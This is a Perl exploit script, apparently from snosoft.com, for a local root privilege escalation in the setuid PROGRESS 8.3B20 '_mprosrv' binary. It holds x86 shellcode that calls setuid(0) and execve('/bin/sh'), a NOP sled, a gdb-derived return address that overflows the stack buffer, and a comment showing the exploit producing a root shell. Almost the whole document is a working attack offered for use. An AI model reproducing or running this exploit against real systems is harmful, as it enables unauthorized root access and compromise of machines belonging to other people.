#!/usr/bin/perl
#
# [root@localhost root]# /usr/dlc/bin/_mprosrv `./_mprosrv-ex.pl`
# sh-2.05#
#
# http://www.snosoft.com - mailto://dotslash@snosoft.com
#
# PROGRESS Version 8.3B20 as of Tue Nov  9 19:00:03 EST 1999
# no patches ... default install. 
# -rwsrwxr-x    1 root     root       557075 Nov  9  1999 _mprosrv*

$eip=0xbfffe501;

# (gdb) x/10s $ecx-5835
# 0xbfffe4e1:      ""
# 0xbfffe4e2:      ""
# 0xbfffe4e3:      ""
# 0xbfffe4e4:      "i686"
# 0xbfffe4e9:      "/usr/dlc/bin/./_mprosrv"
# 0xbfffe501:      '\220' <repeats 200 times>...
# 0xbfffe5c9:      '\220' <repeats 200 times>...
# 0xbfffe691:      '\220' <repeats 200 times>...

$off = "0";
$size= 5748;

$shell = 

   "\x31\xc0\x31\xdb\xb0\x17\xcd\x80".
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b".
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd".
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";

$numretz = (($size  - $shell)/2)/4 ;
$numnopz = ($size  - $shell)/2 ;

for($i = 0; $i < $numnopz; $i++)
{
	$buffer.= pack('l', 0x90);
}

$buffer .=$shell;

for($i = 0; $i < $numretz; $i++)
{
	$buffer.= pack('l', ($eip + $off));
}

print $buffer


